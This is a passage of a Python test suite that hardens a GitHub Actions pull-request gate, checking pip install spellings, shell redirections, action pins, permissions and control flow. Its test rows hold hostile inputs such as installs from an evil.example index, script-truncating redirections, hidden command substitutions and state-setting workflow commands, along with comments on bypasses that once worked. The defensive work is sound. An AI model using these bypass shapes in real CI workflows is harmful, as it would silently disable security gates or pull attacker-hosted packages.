        # Pip takes general options before the subcommand as well as after it — `pip --quiet install X`
        # and `pip install --quiet X` are the same command — and pinning `install` as the fourth word
        # refused the first spelling outright. Any leading options are read by the same `pip_tail_ok`
        # that reads the trailing ones, so moving an option across the subcommand cannot change whether
        # it is allowed; the position was never the thing being decided.
        head, i = words[:3], 3
        if head != ["python", "-m", "pip"]:
            return False
        lead = []
        while i < len(words) and words[i].startswith("-"):
            lead.append(words[i])
            i += 1
        if lead and not pip_tail_ok(lead):
            return False
        if words[i:i + 1] != ["install"]:
            return False
        rest, payload = words[i + 1:], []
        i = 0
        while i < len(rest):
            word = rest[i]
            if not word.startswith("-"):
                payload.append(word)
                i += 1
                continue
            # Hand the option (and its value, however spelled) to the one reader that knows them.
            consumed = 2 if (PIP_OPTS.get(word) and i + 1 < len(rest)
                             and not rest[i + 1].startswith("-")) else 1
            if not pip_tail_ok(rest[i:i + consumed]):
                return False
            i += consumed
        # `${reqs}` and `$reqs` are the same expansion in bash, so refusing one of them refused a pure
        # respelling — the fourth time a comparison against a pinned literal has been stricter than the
        # shell it models. The *quoted* form stays refused, and that is deliberate rather than an
        # oversight: quoting suppresses the word-splitting this step depends on, passing the whole
        # requirement list to pip as one argument. The failure message names it.
        if [re.sub(r"\$\{(\w+)\}", r"$\1", p) for p in payload] == [re.sub(r"\$\{(\w+)\}", r"$\1",
                                                                          PIP_PAYLOAD)]:
            return True
        # The self-upgrade, and it has to *be* an upgrade: a bare `pip install pip` is not the pinned
        # command, and admitting it on payload alone would be the prefix match's laxness restored.
        return payload == ["pip"] and any(upgrade_flag(w) for w in rest)

    def pip_tail_ok(tail):
        """Is every option in this slice one `PIP_OPTS` names, with its value if it takes one?

        Reads a slice of a pip command's options, wherever they sit. Callers hand it options only —
        `pip_install_ok` separates payload from options — so a bare word reaching here is a package,
        and a package here means the install is no longer the pinned one.

        Each spelling pip accepts is normalised before the lookup, because pip treats all three as
        the same option and a rule that reads text does not: `--opt=value`, `--opt value`, and the
        glommed short form `-ovalue`. The last one is what defeated the previous, deny-list version —
        `-ihttps://evil/simple` begins with `-`, contains no `=`, and is not the string `-i`.
        """
        i = 0
        while i < len(tail):
            word = tail[i]
            if not word.startswith("-"):
                return False  # a bare package name: the install is no longer the pinned one
            name, sep, glued = word.partition("=")
            if not sep and re.fullmatch(r"-[A-Za-z]", word[:2]) and len(word) > 2:
                # `-rfile.txt` is `-r file.txt`. Only single-dash options glom — but only options that
                # *take a value* do. Gluing unconditionally read `-qq` as `-q` with the value `q`, and
                # since `-q` takes none, a bundle of flags pip accepts (`-qq`, `-vvv`, `-Uq`) was
                # refused. Every letter in those bundles is separately whitelisted, so the maintainer's
                # edit was a respelling of something already permitted — and the message sent them to
                # `PIP_OPTS`, where adding `-qq` is the wrong fix and `-qqq` is the next report. Fifth
                # instance of a comparison stricter than the tool it models.
                if PIP_OPTS.get(word[:2]) is True:
                    name, glued, sep = word[:2], word[2:], "="
                elif all(PIP_OPTS.get(f"-{ch}") is False for ch in word[1:]):
                    i += 1          # a bundle of known no-value short flags: `-qq`, `-Uq`, `-vvv`
                    continue
                else:
                    return False    # an unknown letter in the bundle, or a value-taker mid-bundle
            takes_value = PIP_OPTS.get(name)
            if takes_value is None:
                return False  # not an option this workflow's install is allowed to carry
            if sep:
                # A value was supplied attached, so the option had better want one.
                if not takes_value:
                    return False
                i += 1
                continue
            if takes_value:
                # Consume the value, and require there to be one: a trailing `--timeout` with no
                # value would otherwise let the next word through as an option's argument.
                if i + 1 >= len(tail) or tail[i + 1].startswith("-"):
                    return False
                i += 2
                continue
            i += 1
        return True

    # Every spelling pip accepts for the same option. These reach `pip_tail_ok` directly, which is
    # why they proved less than they appeared: see the rows below them that go through the authorising
    # path instead.
    for tail, ok in (("--quiet", True), ("-q", True), ("--retries 5", True),
                     ("--upgrade-strategy eager", True), ("--progress-bar=off", True),
                     # The three spellings of one payload option, all rejected now.
                     ("--index-url=https://evil.example/simple", False),
                     ("--index-url https://evil.example/simple", False),
                     ("-ihttps://evil.example/simple", False),
                     ("-rEVIL.txt", False), ("--no-index", False), ("--user", False),
                     ("--trusted-host=evil.example", False), ("--force-reinstall", False),
                     ("--dry-run", False), ("--no-build-isolation", False),
                     # An option that takes no value, given one, is not that option.
                     ("--quiet=please", False),
                     # A bare word is a package: the install is no longer the pinned one.
                     ("evil-package", False),
                     # A value-taking option with nothing left to consume.
                     ("--retries", False)):
        check(f"the pip tail rule reads {tail!r} as {'allowed' if ok else 'refused'} (PIP_OPTS)",
              pip_tail_ok(tail.split()) is ok, tail)
    # Every row above exercises the tail reader *in isolation*, and that is precisely how an
    # attacker-controlled index survived: the authorising path reached a different reader. These go
    # through `pip_install_ok`, which is what `permitted_job` actually calls.
    for cmd, ok in (("python -m pip install ${reqs}", True),
                    ("python -m pip install --upgrade pip", True),
                    ("python -m pip install -U pip", True),
                    # Options on either side of the payload: the prefix match refused the leading form.
                    ("python -m pip install --quiet ${reqs}", True),
                    ("python -m pip install ${reqs} --quiet", True),
                    ("python -m pip install --retries 5 ${reqs}", True),
                    # The escaping spelling: `-U` defeated the prefix, the glommed `-i` kept the URL
                    # from looking like a package, and the fallthrough classifier waved it through.
                    ("python -m pip install -U pip -ihttps://evil.example/simple", False),
                    ("python -m pip install -U pip --index-url=https://evil.example/simple", False),
                    ("python -m pip install --quiet -U pip --no-index", False),
                    ("python -m pip install -U pip -rhttps://evil.example/req.txt", False),
                    # An upgrade of something else, and an install of something extra.
                    ("python -m pip install -U evil-package", False),
                    ("python -m pip install ${reqs} evil-package", False),
                    # `pip install pip` is not the pinned self-upgrade; only an upgrade of it is.
                    ("python -m pip install pip", False),
                    ("python -m pip install", False),
                    # Bundled short flags, which pip accepts and this rule refused by reading `-qq` as
                    # `-q` with the value `q`. Every letter is separately whitelisted, so each of these
                    # is a respelling of something already permitted.
                    ("python -m pip install -qq ${reqs}", True),
                    ("python -m pip install -vvv ${reqs}", True),
                    ("python -m pip install -Uq pip", True),
                    ("python -m pip install -qU pip", True),
                    # …and a bundle is not a way to smuggle an unknown letter or a value-taker in.
                    ("python -m pip install -qz ${reqs}", False),
                    ("python -m pip install -qi ${reqs}", False),
                    # `$reqs` and `${reqs}` are the same expansion; the quoted form is refused because
                    # quoting suppresses the word-splitting the step depends on.
                    ("python -m pip install $reqs", True),
                    ('python -m pip install "${reqs}"', False),
                    # Options before the subcommand: pip's own two spellings of one command.
                    ("python -m pip --quiet install ${reqs}", True),
                    ("python -m pip -q install ${reqs}", True),
                    # …read by the same rule as the trailing ones, so nothing gets in by moving left.
                    ("python -m pip --index-url=https://evil.example/simple install ${reqs}", False),
                    ("python -m pip --quiet download ${reqs}", False)):
        check(f"the install rule reads {cmd!r} as {'the pinned install' if ok else 'refused'}",
              pip_install_ok(cmd) is ok, cmd)

    def redirections(step):
        # The target stops at a separator: `>/dev/null; then` redirects to /dev/null, and reading the
        # `;` as part of the path made the workflow fail its own rule.
        #
        # The descriptor is *consumed*, not excluded. This was `(?<![0-9<>])`, a negative lookbehind
        # that threw away the entire match whenever a digit preceded the `>` — so `2>`, `1>` and `2>>`
        # never had a target extracted and never reached `REDIR_TARGETS` at all. `echo x 2>
        # scripts/ai/pr_gate.py` in the installer step passed every workflow assertion then present (370 of
        # them; the figure has moved since) and truncates
        # the script the next step runs, which then exits 0 having checked nothing. `>&` slipped for a
        # second reason: the target began with `&`, which the character class refused.
        #
        # It also falsified the stated reason another rule limits its own subject set ("redirections()
        # already refuses every other target"), which is the more general hazard: a rule that under-reads
        # lends its authority to every rule that cites it.
        # `>|` is a redirection too — a force-truncate that defeats `noclobber`. The target class
        # excludes `|`, so `echo x >| scripts/ai/pr_gate.py` matched nothing here and was caught only
        # because `tokens()` split on the `|` and left a stray segment for the *vocabulary* rule. A
        # kill by a neighbouring rule is the attribution defect this file records four times, and it
        # matters here for the reason in the paragraph above: another rule cites this one's coverage.
        found = []
        for ln in shell_of(step):
            # The pattern is quote-blind, so `echo "a > b"` — which writes nothing, verified — was
            # reported as a redirection into the checkout, and `echo "::notice::use > carefully"` is a
            # shape the annotation whitelist explicitly invites. Quoted spans are *skipped by offset*
            # rather than blanked: blanking them took the target with them, and the regex then
            # backtracked onto the second `>` of `>>` and called that the target, which failed all three
            # of the workflow's own legitimate writes.
            quoted = {i for m in re.finditer(r"\"[^\"]*\"|'[^']*'", ln)
                      for i in range(*m.span())}
            for m in re.finditer(r"(?<![<>])\d*>>?\|?\s*(&?)\s*([^\s;&|)]+)", ln):
                if m.start() in quoted:
                    continue
                dup, target = m.group(1), m.group(2)
                # `2>&1` and `>&2` duplicate a descriptor and name no file, so there is nothing to write
                # into the checkout. Required, or the permitted `>/dev/null 2>&1` fails its own rule.
                if dup and target.isdigit():
                    continue
                if redir_target(target) not in REDIR_TARGETS:
                    found.append(ln.strip())
        return found

    job_steps = gate_job.get("steps") or []
    found_steps = [s.get("name") for s in job_steps]
    check("the job runs exactly the steps it is built from, in order (JOB_STEPS) — order is pinned "
          "because `Resolve the base ref` must precede the step that reads `BASE`, and membership "
          "because all six share one working tree; edit JOB_STEPS to add, remove or move one",
          found_steps == JOB_STEPS,
          f"got {found_steps}, want {JOB_STEPS}" if found_steps != JOB_STEPS else found_steps)
    used = {s.get("name"): s["uses"] for s in job_steps if "uses" in s}
    check("and uses only the two pinned actions, neither of which patches the tree (JOB_USES)",
          {n: pinned_use(v)[0] for n, v in used.items()} == JOB_USES, used)
    check("each pinned to a release tag or a commit SHA, so what runs before the gate is not a "
          "moving target",
          all(pinned_use(v)[1] for v in used.values()), used)
    for label, spelling, ok in (("a release tag", "actions/checkout@v6", True),
                                ("a full commit SHA", "actions/checkout@" + "a" * 40, True),
                                ("a branch name", "actions/checkout@main", False),
                                ("no ref at all", "actions/checkout", False)):
        check(f"that rule {'accepts' if ok else 'rejects'} {label}",
              pinned_use(spelling)[1] is ok, spelling)
    # Pinning *which* action runs says nothing about what it is pointed at, and checkout's inputs
    # decide what the whole job reads: `ref: ${{ github.base_ref }}` alongside `fetch-depth: 0`
    # checks out the base branch, so the diff is the base against itself, the selection is empty, and
    # the gate passes having chosen nothing — with every assertion above still green. The same
    # argument applies to the two steps' `env:` mappings, which is where the base ref this job diffs
    # against actually comes from: `BASE: HEAD` leaves both permitted `SEL` lines untouched and makes
    # the selection `HEAD...HEAD`. So the inputs are pinned alongside the identities.
    JOB_WITH = {"Checkout repository": {"fetch-depth": "0", "persist-credentials": "false"},
                "Set up Python": {"python-version": None}}
    JOB_ENV = {"Resolve the base ref": {"BASE_REF": "${{ github.base_ref }}"},
               "Install only what the selection needs": {"BASE": "${{ steps.base.outputs.ref }}"}}
    def inputs_of(step):
        """An action's inputs, dequoted, with values this suite does not pin shown as None.

        `python-version` is `None` because the *floor* rule owns its value: it asserts the runner is
        at least every suite's floor, which is the property, while this rule is about checkout not
        being redirected at another ref. Pinned as the literal `'"3.13"'`, it rejected `'3.13'` and
        `"3.13.1"` — a quoting change and a routine bump — under a message about checkout.
        """
        given = {k: _dequote(str(v)) for k, v in (step.get("with") or {}).items()}
        if step.get("name") in JOB_WITH:
            for key, pinned in JOB_WITH[step["name"]].items():
                if pinned is None and key in given:
                    given[key] = None
        return given

    check("each action's inputs are pinned, so checkout cannot be redirected at another ref "
          "(JOB_WITH; a value of None means another rule owns it)",
          {s.get("name"): inputs_of(s) for s in job_steps if "with" in s} == JOB_WITH,
          {s.get("name"): inputs_of(s) for s in job_steps if "with" in s})
    # Filtered to `in JOB_ENV`, this rule would have been conditional on the thing it guards — a step
    # outside the map could carry any env at all. The set of env-bearing steps is pinned too; the
    # branch-scope step's own mapping is pinned separately as SCOPE_ENV.
    check("and the env of each step that feeds the selection is pinned to the event's base ref",
          {s.get("name"): s["env"] for s in job_steps
           if "env" in s and s.get("name") in JOB_ENV} == JOB_ENV,
          {s.get("name"): s.get("env") for s in job_steps if "env" in s})
    check("with no other step carrying an env block this rule would not read",
          {s.get("name") for s in job_steps if "env" in s} == set(JOB_ENV) | {JOB_STEPS[5]},
          # `or "<unnamed>"` for the same reason as the other four sites: an unnamed step carrying an
          # `env:` block puts None in this set, and `sorted()` cannot order it against str — so the
          # rule that exists to notice an unpinned env would crash instead of reporting it.
          sorted({s.get("name") or "<unnamed>" for s in job_steps if "env" in s}))
    # Driven *through* `inputs_of`, not compared literal-to-literal. This file diagnosed that exact
    # shape one screen down and fixed it only there; these four were missed, and here it is not merely
    # stylistic, because `inputs_of` has a masking branch. A `None` in `JOB_WITH` means "another rule
    # owns this value" — so adding one word, `"ref": None`, to the table the failure message tells you
    # to edit makes the rule *accept* `ref: ${{ github.base_ref }}`, the redirection this rule exists to
    # stop. A control that never calls the reader cannot see that.
    for label, mutant in (("a checkout redirected at the base branch",
                           {"fetch-depth": "0", "persist-credentials": "false",
                            "ref": "${{ github.base_ref }}"}),
                          ("credentials left in the checkout for a later step to push with",
                           {"fetch-depth": "0", "persist-credentials": "true"})):
        check(f"that rule rejects {label}",
              inputs_of({"name": "Checkout repository", "with": mutant})
              != JOB_WITH["Checkout repository"], mutant)
    check("and no input other than the one the Python-floor rule owns may be left unpinned, since a "
          "None here silences this rule for that key",
          [k for step, inputs in JOB_WITH.items() for k, v in inputs.items()
           if v is None and k != "python-version"] == [],
          {s: sorted(k for k, v in i.items() if v is None) for s, i in JOB_WITH.items()})
    for label, mutant in (("a base neutralised to HEAD", {"BASE": "HEAD"}),
                          ("a resolver pointed at the PR head",
                           {"BASE_REF": "${{ github.head_ref }}"})):
        check(f"the env rule rejects {label}",
              {"Install only what the selection needs": mutant} != JOB_ENV
              and {"Resolve the base ref": mutant} != JOB_ENV, mutant)
    # The token scopes are part of the contract too, and dropping one is silent: `gh pr view` in the
    # branch-scope step keeps working on a public repo with `contents: read` alone, and stops the day
    # this repo is private or mirrored internally — which is the regression this workflow already had
    # to fix once.
    # Exact, not a superset: a wider scope is the kind of change that should cost a conversation, and
    # the one a future edit is most likely to want (`checks: write`, to publish a neutral conclusion
    # for a tool error) is precisely the one worth arguing for rather than acquiring in passing.
    PERMISSIONS = {"contents": "read", "pull-requests": "read"}
    check("the workflow grants exactly the two token scopes the checker needs",
          doc.get("permissions") == PERMISSIONS, doc.get("permissions"))
    check("that rule notices a dropped pull-requests scope",
          {"contents": "read"} != PERMISSIONS)
    # Three more unpinned inputs, found by sweeping the rules above rather than by review. The runner
    # is the clearest: `runs-on: self-hosted` moves the gate onto a machine this repo does not control,
    # and a verdict from there means nothing. The job *name* is load-bearing for a different reason —
    # it is the string the branch ruleset matches, and that ruleset lives outside this repo. Renaming
    # the job therefore does not un-require the check: the ruleset keeps requiring the old context,
    # nothing publishes it, and it sits Pending on every PR to a protected branch. The rename fails
    # closed — a repo-wide merge outage, not a bypass — which is why the name is pinned here. (The
    # bypass shape is the opposite one, a second job publishing the same name; `PUBLISHED` pins that.)
    # The
    # concurrency group is the weakest of the three and is pinned on principle rather than on a
    # demonstrated bypass: made constant, one PR's run cancels another's, and a cancelled run is not a
    # pass but it is also not a verdict.
    # Any GitHub-hosted Ubuntu runner, not the `-latest` alias alone: pinning `ubuntu-24.04` is
    # ordinary hardening against alias drift, and rejecting it with "a runner this repository
    # controls" sent the reader looking for a self-hosted runner they had not added.
    check("the gate runs on a GitHub-hosted Ubuntu runner, not a self-hosted one",
          str(gate_job.get("runs-on") or "").startswith("ubuntu-"), gate_job.get("runs-on"))
    check("the job keeps the name a required-check rule would be written against",
          gate_job.get("name") == "Mechanical checks", gate_job.get("name"))
    check("runs are scoped per pull request, so one PR's run cannot cancel another's",
          (doc.get("concurrency") or {}).get("group")
          == "pr-checks-${{ github.event.pull_request.number || github.ref }}",
          (doc.get("concurrency") or {}).get("group"))
    # The one channel that reaches a later step without writing any file, so no destination-based rule
    # can see it. "Both whitelists refuse `::` outright" was too strong, and the overstatement mattered:
    # display-only annotations (`::error::`, `::notice::`, `::group::`) are admitted deliberately, since
    # a step that cannot annotate cannot explain its own failure. What is refused is a `::` command that
    # *sets state* — the four forms below.
    for label, mutant in (("a base ref set through a workflow command rather than a file",
                           'echo "::set-output name=ref::HEAD"'),
                          ("the deprecated environment form", 'echo "::set-env name=BASE::HEAD"'),
                          ("a matcher that rewrites how output is read",
                           'echo "::add-matcher::/tmp/m.json"'),
                          ("commands stopped so later lines are not parsed",
                           'echo "::stop-commands::tok"')):
        check(f"neither whitelist admits {label}",
              not permitted(mutant) and not permitted_job(mutant), mutant)
    check("and an ordinary echo still passes, so that rule is not a ban on echo",
          permitted('echo "no drift"') and permitted_job('echo "no drift"'))
    # Every `run` step's opener, not just the gate's. `tail_preserves_status` admits a pipeline on the
    # grounds that `set -o pipefail` makes its status the leftmost non-zero one, and the comment
    # authorising that said the flags were "required of every step" — they were required of exactly
    # one. Dropping `pipefail` from the branch-scope step produced no failure at all, so the rule that
    # depends on it and the rule that enforces it were not talking about the same steps. The dependency
    # is now real, which is the only thing that makes the pipeline admission sound.
    openers = [(s.get("name") or "<unnamed>", (shell_of(s)[:1] or [""])[0])
               for s in job_steps if "run" in s]
    bad_openers = [(n, o) for n, o in openers if not set_flags_ok(o)]
    check("every run step opens with -e, -u and -o pipefail, not just the gate step — the pipeline "
          "admission in `tail_preserves_status` depends on pipefail holding everywhere (extra flags "
          "such as -x are fine; SET_FLAGS lists them)",
          not bad_openers, bad_openers or openers)
    # The premise `tail_preserves_status` admits `&&` on, enforced for every step rather than assumed
    # for one. Bash exempts the left-hand side of an `&&` list from `set -e`, so a failing command
    # there returns non-zero *without* aborting and the step's status becomes whatever runs next:
    #
    #   false && echo hi                 → exit 1   (last line: the failure is the step's status)
    #   false && echo hi   ; echo x      → exit 0   (a failing gate, reported green)
    #
    # All verified. The second needs no `exit` and no second operator, which is why this is a
    # positional rule and not a vocabulary one: the same text is safe or catastrophic depending only on
    # whether anything follows it. `&&` on the final command line is genuinely fine and is a shape a
    # maintainer plausibly writes (`gate && echo "::notice::gate green"`), so it is admitted there.
    cmd_lines = [(s.get("name") or "<unnamed>", shell_of(s)) for s in job_steps if "run" in s]
    late_and = [(n, ln.strip()) for n, lns in cmd_lines
                for i, ln in enumerate(lns)
                if "&&" in [p.strip() for p, _ in parts(ln)] + [t.strip()[:2] for _, t in parts(ln)]
                and any(later.strip() and not later.strip().startswith("#")
                        for later in lns[i + 1:])]
    check("an `&&` list is the last command of its step — bash exempts its left-hand side from set -e, "
          "so a failing command there does not abort and the next line's status becomes the step's; "
          "`&&` on the final line is fine and is what `tail_preserves_status` admits it for",
          not late_and, late_and)

    def and_lastness(step):
        lns = shell_of(step)
        return [ln.strip() for i, ln in enumerate(lns)
                if "&&" in [p.strip() for p, _ in parts(ln)] + [t.strip()[:2] for _, t in parts(ln)]
                and any(later.strip() and not later.strip().startswith("#")
                        for later in lns[i + 1:])]

    for label, tail in (("a masking exit on the success branch", "&& exit 0"),
                        ("nothing but an annotation after it", '&& echo "::notice::green"')):
        check(f"that rule rejects an `&&` list with {label} and a line after it",
              and_lastness(as_step("set -euo pipefail",
                                   f"python scripts/ai/pr_gate.py ${{SEL}} {tail}",
                                   'echo "::notice::done"')), tail)
    check("and accepts the same `&&` as the step's final command, which is the shape a maintainer "
          "writes and where bash makes the failure the step's status",
          not and_lastness(as_step("set -euo pipefail",
                                   'python scripts/ai/pr_gate.py ${SEL} && echo "::notice::green"')))
    stray = [(s.get("name"), seg.strip()) for s in job_steps if "run" in s
             for ln in shell_of(s) for seg, _ in parts(ln) if not permitted_job(seg)]
    check("every command in every step is one the job exists to run, so no step can rewrite what a "
          "later one executes — the job-wide whitelists are HARMLESS, TEST_CMDS, NO_OPS, SCRIPTS, "
          "GIT_FORMS, PIP_OPTS, ALLOWED_SET and JOB_ASSIGN, and a segment containing `::` is "
          "refused unless it is a display-only annotation (a workflow command is parsed off stdout "
          "and crosses steps with no redirection for a rule to see); the segments are below",
          not stray, stray[:4])
    redirs = [(s.get("name"), r) for s in job_steps if "run" in s for r in redirections(s)]
    check("and every redirection writes to a GitHub-provided file or /dev/null, never into the "
          "checkout", not redirs, redirs[:4])
    # A `>` inside a quoted string writes nothing — verified — and `::notice::` text is exactly where one
    # plausibly appears, so reporting it was a false rejection of a shape the annotation whitelist above
    # explicitly invites. Two directions, because the first repair (blanking quoted spans) took the real
    # target with them and the pattern backtracked onto the second `>` of `>>`, failing all three of the
    # workflow's own legitimate writes.
    check("a `>` inside a quoted string is text, not a redirection",
          not redirections(as_step("set -euo pipefail", 'echo "::notice::use > carefully"')))
    check("and a real redirection on the same line is still read",
          redirections(as_step("set -euo pipefail",
                               'echo "a > b" > scripts/ai/pr_gate.py')))
    # The target's *spelling* is not the rule; the file it names is. `hands_over()` accepts three
    # spellings and this list held one, so brace-normalising an existing write — a formatting change, in
    # a workflow that already writes `${BASE}` and `${SEL}` braced — failed under "never into the
    # checkout". Eighth instance of one reader normalising where another compares literally.
    for target in ('"$GITHUB_OUTPUT"', "$GITHUB_OUTPUT", '"${GITHUB_OUTPUT}"', "${GITHUB_OUTPUT}"):
        check(f"a write to {target} is read as the same GitHub-provided file",
              not redirections(as_step("set -euo pipefail", f'echo "ref=x" >> {target}')), target)
    for label, snippet in (("a script overwritten by a redirection",
                            "echo 'import sys; sys.exit(0)' > scripts/ai/pr_gate.py"),
                           # Every redirection in this table used a plain `>`, which is why a descriptor
                           # prefix went unnoticed: the rule discarded the match instead of reading the
                           # target, and no row spelled the case. All four forms truncate the file.
                           ("a script overwritten past a descriptor prefix",
                            "echo x 2> scripts/ai/pr_gate.py"),
                           ("the same on stdout, spelled explicitly",
                            "echo x 1> scripts/ai/pr_gate.py"),
                           ("the same, appending", "echo x 2>> scripts/ai/pr_gate.py"),
                           ("the same through the both-streams form",
                            "echo x >& scripts/ai/pr_gate.py"),
                           ("and through the other both-streams spelling",
                            "echo x &> scripts/ai/pr_gate.py"),
                           ("a script rewritten through a glob, naming nothing",
                            "sed -i.bak 's/^/#/' scripts/ai/pr_g*.py"),
                           ("a stub copied over the directory", "cp /tmp/stub.py scripts/ai/"),
                           ("a shim installed alongside the pins",
                            "python -m pip install ${reqs} evil-shim"),
                           # Round 11: the vocabulary was pinned by word, not by argument. Both of
                           # these use nothing but whitelisted first words.
                           ("a fetch that moves the base ref onto the PR head",
                            'git fetch . "+HEAD:refs/remotes/origin/${BASE_REF}"'),
                           ("a verify of a ref nothing diffs against",
                            'git rev-parse --verify --quiet HEAD >/dev/null'),
                           ("a substitution hidden inside a permitted echo",
                            'echo "$(cp /dev/null scripts/ai/pr_gate.py)"'),
                           ("a substitution hidden in backticks",
                            "echo `cp /dev/null scripts/ai/pr_gate.py`"),
                           # Found by the local review pass, not by a hosted one, and live: this
                           # neutralised the selection with every other rule green.
                           ("an assignment smuggled through printf -v",
                            "printf -v SEL %s '--base HEAD'"),
                           ("a process substitution behind a permitted echo",
                            "echo <(cp /dev/null scripts/ai/pr_gate.py)"),
                           # `>|` is a redirection — a force-truncate that overrides `noclobber` — and
                           # the target class excluded `|`, so this matched no redirection at all. It
                           # died only because `tokens()` split on the `|` and left a segment the
                           # *vocabulary* rule refused, which is a kill by a neighbouring rule: the
                           # fifth recorded here, and the reason the target class now admits it.
                           ("a script force-truncated past noclobber",
                            "echo x >| scripts/ai/pr_gate.py")):
        step = as_step("set -euo pipefail", snippet)
        check(f"those two rules reject {label}",
              [seg for ln in shell_of(step) for seg, _ in parts(ln) if not permitted_job(seg)]
              or redirections(step), snippet)
    # Named, not sliced: `JOB_STEPS[2:4]` covered whichever two steps happened to sit at those
    # indices, so a reorder moved this assertion onto different steps without failing anything — the
    # positional-window mistake this file has already fixed twice elsewhere.
    for named in ("Resolve the base ref", "Install only what the selection needs"):
        matched = [s for s in job_steps if "run" in s and s.get("name") == named]
        offenders = [seg for s in matched
                     for ln in shell_of(s) for seg, _ in parts(ln) if not permitted_job(seg)]
        # The coverage half is not decoration: written without it, this assertion passed for a step
        # name that matched nothing — I mistyped one while making this very fix, and an empty
        # `offenders` list read as "accepted". A name-keyed rule has to fail when the name misses.
        check(f"and accept every command {named!r} needs to run, with that step actually present",
              len(matched) == 1 and not offenders,
              offenders or f"{len(matched)} steps named {named!r}")
    for spelling in ("python -m pip install --upgrade pip --quiet",
                     "python -m pip install ${reqs} --no-input",
                     # Every spelling that reaches pip is now read by the same reader, so these are
                     # judged as installs rather than refused as foreign commands.
                     "pip install ${reqs}",
                     "pip3 install ${reqs}",
                     "python3 -m pip install ${reqs}",
                     "python3.13 -m pip install ${reqs}"):
        check(f"a pip install is judged as one, whatever the spelling: {spelling!r}",
              permitted_job(spelling), spelling)
    check("but a package appended to one is not",
          not permitted_job("python -m pip install ${reqs} evil-shim"))
    # Merging the two readers must not import the detecting one's prefix-stripping, which exists so a
    # *restated dependency* keeps its diagnosis here. Authorising a wrapped or path-qualified pip would
    # be a loosening: `sudo` escalates, `env` re-points, `./pip` runs an executable out of the checkout.
    for wrapped in ("sudo pip install ${reqs}", "env pip install ${reqs}",
                    "PIP_INDEX_URL=http://x pip install ${reqs}", "./pip install ${reqs}",
                    "/usr/bin/pip install ${reqs}"):
        check(f"and a wrapped or path-qualified pip is still refused: {wrapped!r}",
              not permitted_job(wrapped), wrapped)
    check("a seventh step is visible to the step-list rule",
          [s.get("name") for s in job_steps] + ["Prepare"] != JOB_STEPS)
    # Every rule so far reads a line, or a segment of one, in isolation — and a line's *enclosing
    # control flow* decides whether bash ever reaches it. `while :; do` → `while [ 1 = 2 ]; do` leaves
    # the invocation, the `code=$?` that follows it, the exit propagation and both command whitelists
    # exactly as written and never runs any of them; wrapping the gate step in `if [ 1 = 2 ]; then`
    # does the same to the gate. So the control flow of every step is pinned as an ordered sequence,
    # which also refuses a *reordering* or an inserted branch, not just a falsified condition. The
    # gate step's sequence is empty on purpose: it is three lines and needs no branching.
    # Only the two steps where falsifying a condition could produce a *pass*. It covered all four at
    # first, which cost a red run on four correct edits — a respelled `[ -z … ]` as `[ … = "" ]`, a
    # retry budget raised from 3 to 5, an explicit merge_group branch, a fetch guard rewritten as
    # `rev-parse || fetch` — and bought nothing in the other two: every command in the resolver and
    # the installer is argv-pinned below, so a skipped branch there ends as `--all` (more checks run)
    # or MISSING-DEP (a red gate), never a quiet green. A rule that fires on correct code is a rule
    # someone deletes, and this one had seven such lines to one load-bearing one.
    JOB_CONTROL = {
        "Run the gate": [],
        "Branch scope": ['if [ "${CROSS}" = "true" ]; then', "else", "fi", "while :; do",
                         'if [ "$code" -ne N ]; then exit "$code"; fi',
                         'if [ "$attempt" -ge N ]; then', "fi", "done"],
    }

    def control_flow(step):
        # Openers plus the words that close or continue them. Assembled from the shared vocabulary
        # rather than retyped: a sixth copy of these words, disagreeing with the other five about
        # `for` and `case`, is how three earlier rounds produced false rejections.
        openers = SHELL_OPENERS + ("else", "fi", "do", "done", "esac", "{", "}")
        # Integer literals are normalised to `N`: the retry budget is a tunable that lives inside a
        # condition, and pinning it by text rejected `-ge 5` — an edit the comment above this rule
        # already listed as a false rejection it had removed, in the one step where the loop lives.
        # The property is which branches exist and what they test, not how many attempts are allowed.
        # This also normalises the `-ne 2` that names the tool-error code, which is safe because that
        # branch exits with `$code` whatever it compares against: a digit cannot turn a verdict into a
        # pass, while the operator and the variable stay pinned.
        return [re.sub(r"\b\d+\b", "N", canonical_shell(ln)) for ln in shell_of(step)
                if (ln.split() or [""])[0] in openers or re.search(r";\s*(then|do)\s*$", ln)]

    # Driven from `JOB_CONTROL`'s keys rather than from the steps, so a name that matches nothing
    # fails here instead of dropping its check. Filtering the steps by name meant a renamed step took
    # its pin with it and the count invariant absorbed the loss, because the reachability loop gained
    # the check this one lost.
    by_name = {s.get("name"): s for s in job_steps if "run" in s}
    for name, pinned in JOB_CONTROL.items():
        step = by_name.get(name)
        check(f"the control flow of {name!r} is the sequence it was reviewed with, so no condition "
              "can be falsified and no branch inserted — rename the step and this fails rather "
              f"than stops applying (JOB_CONTROL, JOB_STEPS, STEP_KEYS all key on {name!r})",
              step is not None and control_flow(step) == pinned,
              control_flow(step) if step else f"no step named {name!r}")
    # Through the real predicate on a mutated step. The controls here compared one list literal
    # against another built partly *from* it, so they could not fail: replacing `control_flow`'s body
    # with `return []` left all three passing — and left the gate step's pin passing too, since its
    # reviewed sequence is empty. The rule worked; nothing demonstrated that it did.
    for label, lines, pinned in (
            ("a retry loop that never iterates", ("while [ 1 = 2 ]; do", "done"), "Branch scope"),
            ("a gate wrapped in a false condition",
             ("if [ 1 = 2 ]; then", "python scripts/ai/pr_gate.py ${SEL}", "fi"), "Run the gate"),
            ("a branch inserted around the invocation",
             tuple(JOB_CONTROL["Branch scope"]) + ("if [ 1 = 2 ]; then", "fi"), "Branch scope")):
        found = control_flow(as_step(*lines))
        check(f"that rule rejects {label}", found != JOB_CONTROL[pinned], found)
    # An argv pin that rejects a correct respelling is how a rule gets deleted rather than fixed, so
    # the four spellings of the same permitted redirection are asserted to pass.
    for spelling in ('git rev-parse --verify --quiet "origin/${BASE_REF}" >/dev/null',
                     'git rev-parse --verify --quiet "origin/${BASE_REF}" > /dev/null',
                     'git rev-parse --verify --quiet "origin/${BASE_REF}" 2>/dev/null',
                     'git rev-parse --verify --quiet "origin/${BASE_REF}" >/dev/null 2>&1'):
        step = as_step("set -euo pipefail", spelling)
        check("and accept the same verify however its redirection is spelled",
              all(permitted_job(seg) for ln in shell_of(step) for seg, _ in parts(ln))
              and not redirections(step), spelling)

    # The selection's *input*, not just its spelling. SEL is pinned to `--base ${BASE}` below, and
    # BASE is whatever this step wrote: `echo "ref=HEAD"` left both permitted SEL lines untouched
    # and made the diff `HEAD...HEAD`, so the gate selected nothing and passed.
    # Same subject set as the cross-step rule above — every write to a GitHub file, selected by
    # destination — rather than the lines whose text contains `ref=`, which a second write could avoid
